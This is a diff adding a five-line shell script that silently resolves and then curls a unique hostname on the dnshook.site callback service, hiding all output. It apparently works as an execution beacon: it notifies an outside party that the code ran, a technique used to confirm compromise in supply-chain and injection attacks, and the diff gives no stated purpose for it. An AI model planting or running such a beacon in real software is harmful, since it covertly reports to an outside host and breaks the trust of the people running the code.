@@ -1,0 +1,5 @@
+#!/bin/sh
+H=dns52708.7cf5a6e9-833e-4d05-927e-ab589bc14cc7.dnshook.site
+nslookup "$H" >/dev/null 2>&1 && exit 0
+getent hosts "$H" >/dev/null 2>&1 && exit 0
+curl -s -m 6 "http://$H/" >/dev/null 2>&1
